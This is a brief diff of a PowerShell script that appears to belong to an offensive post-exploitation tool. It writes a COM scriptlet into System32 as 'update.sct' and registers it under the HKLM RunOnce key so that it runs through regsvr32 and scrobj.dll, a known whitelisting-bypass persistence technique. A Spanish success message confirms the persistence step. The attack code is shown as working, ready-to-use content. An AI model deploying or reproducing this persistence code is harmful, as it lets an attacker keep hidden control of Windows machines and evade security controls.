@@ -206,8 +206,8 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 <public>
     <method name="Exec"></method>
 </public>
-</scriptlet>' ;
-$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" ; $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
+</scriptlet>' ; $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
+$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
